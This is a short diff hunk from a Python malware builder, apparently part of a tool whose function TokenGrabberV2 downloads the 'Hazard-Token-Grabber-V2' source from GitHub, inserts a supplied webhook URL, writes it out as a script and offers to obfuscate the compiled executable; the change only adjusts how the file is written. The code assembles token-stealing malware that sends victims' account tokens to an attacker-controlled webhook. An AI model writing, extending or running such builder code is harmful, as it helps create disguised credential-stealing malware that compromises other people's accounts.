@@ -27,7 +27,7 @@ def TokenGrabberV2(WebHook, fileName):
     ]
     installPackage(required)
     code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
-    with open(f"{fileName}.py", 'w') as f:
+    with open(f"{fileName}.py", 'w', errors="ignore") as f:
         f.write(code)
 
     print(f"Do you want to obfuscate {fileName}.exe?")
